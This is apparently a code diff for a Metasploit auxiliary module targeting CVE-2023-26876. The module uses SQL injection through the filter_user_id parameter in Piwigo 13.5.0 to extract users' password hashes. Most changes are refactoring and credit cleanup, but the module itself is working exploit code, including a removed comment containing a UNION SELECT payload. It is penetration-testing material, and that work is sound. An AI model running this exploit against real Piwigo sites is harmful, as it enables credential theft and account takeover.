@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::SQLi
+  prepend Msf::Exploit::Remote::AutoCheck
   require 'metasploit/framework/hashes'
 
   def initialize(info = {})
@@ -17,20 +18,20 @@ class MetasploitModule < Msf::Auxiliary
           This module allows an authenticated user to retrieve the usernames and encrypted passwords of other users in Piwigo through SQL injection using the (filter_user_id) parameter.
         },
         'Author' => [
-          'rodnt'
+          'rodnt', # metasploit module
+          'Rodolfo Tavares', # vulnerability discovery
+          'Tempest Security, Henrique Arcoverde' # special thanks
         ],
         'License' => MSF_LICENSE,
         'References' => [
           [ 'CVE', '2023-26876' ],
           ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-26876'],
-          ['Discover', 'Rodolfo Tavares'],
-          ['Thanks', 'Tempest Security', 'Henrique Arcoverde']
-
         ],
         'DisclosureDate' => '2023-04-21',
         'Notes' => {
           'Stability' => ['CRASH_SAFE'],
-          'SideEffects' => ['IOC_IN_LOGS']
+          'SideEffects' => ['IOC_IN_LOGS'],
+          'Reliability' => []
         }
       )
     )
@@ -53,8 +54,8 @@ class MetasploitModule < Msf::Auxiliary
       'uri' => login_page
     )
 
-    if res && res.code == 200 && res.body.match(/jquery.min.js?v13.5.0/)
-      return Exploit::CheckCode::Detected('The target is running Piwigo with version 13.5.0')
+    if res && res.code == 200 && res.body.match(%r{themes/default/js/jquery.min.js\?v13.5.0})
+      return Exploit::CheckCode::Appears('The target is running Piwigo with version 13.5.0')
     else
       return Exploit::CheckCode::Safe('The target does not appear to be running Piwigo with vulnerable version')
     end
@@ -62,11 +63,10 @@ class MetasploitModule < Msf::Auxiliary
     return Exploit::CheckCode::Unknown("#{peer} - Connection failed")
   end
 
-  def login(response)
-    return false unless response
+  def login
 
     login_uri = target_uri.path.end_with?('identification.php') ? normalize_uri(target_uri.path) : normalize_uri(target_uri.path, '/identification.php')
-    print_status('try to log in..')
+    print_status('Try to log in..')
 
     login_res = send_request_cgi(
       'method' => 'POST',
@@ -83,17 +83,16 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::NoAccess, "Couldn't log into Piwigo")
     end
 
-    print_good('successfully logged into Piwigo!!')
-    return login_res
+    print_good('Successfully logged into Piwigo')
   end
 
   def test_vulnerable(response)
     body_response = response.body.to_s
     if body_response.include?('var filter_user_name = "pwn3d";')
-      print_good('target is vulnerable')
+      print_good('Target is vulnerable')
       return true
     else
-      print_error('target is NOT vulnerable')
+      print_error('Target is NOT vulnerable')
       return false
     end
   end
@@ -111,9 +110,7 @@ class MetasploitModule < Msf::Auxiliary
     if match
       data = match[1]
       data.split(',').each do |user_and_pw|
-        split_user_pw = user_and_pw.split(';')
-        user = split_user_pw[0]
-        hash = split_user_pw[1]
+        user, hash = user_and_pw.split(';', 2)
 
         creds_table << [user, hash]
         create_credential({
@@ -140,7 +137,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_info
-    # 123123123 union all select group_concat(username,password) from piwigo_users
     sqli = create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
       send_request_cgi({
         'method' => 'GET',
@@ -159,10 +155,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    available_res = check
-    fail_with(Failure::NotFound, 'Could not access the Piwigo webpage') unless available_res
-    response_from_login = login(available_res)
-    fail_with(Failure::NoAccess, 'Could not log in. Verify credentials') unless response_from_login
+    login
     get_info
   end
 end
